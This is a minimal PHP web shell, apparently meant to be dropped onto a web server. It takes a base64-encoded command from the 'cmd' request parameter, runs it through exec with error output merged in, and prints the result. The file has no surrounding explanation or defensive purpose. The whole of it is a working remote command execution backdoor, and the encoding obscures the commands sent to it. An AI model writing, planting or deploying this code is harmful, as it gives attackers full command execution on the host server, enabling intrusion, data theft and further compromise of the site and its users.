<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('exec')) {
		@exec($s_c,$s_r);
		foreach($s_r as $s_s) 
			$s_out .= $s_s;
		return $s_out;
	}
}

if(isset($_REQUEST['cmd'])){
	$s_cmd = base64_decode($_REQUEST['cmd']);
	echo exe($s_cmd);
}
?>